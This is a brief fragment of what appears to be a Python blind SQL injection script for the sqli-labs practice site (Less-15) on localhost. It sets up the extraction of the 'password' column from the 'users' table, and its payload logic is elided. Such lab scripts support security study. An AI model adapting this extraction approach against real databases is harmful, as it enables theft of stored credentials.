...
def getPayload(result_index, char_index, ascii):
    # 系统表中数据
    info_database_name = "security"
    info_table_name = "users"  # schemata / tables / columns
    info_column_name = "password"  # schema_name / table_name / column_name
...
def execute(result_index, char_index, ascii):
    # 连接url
    url = "http://localhost:81/SQLI-LABS/sqli-labs-master/Less-15/"
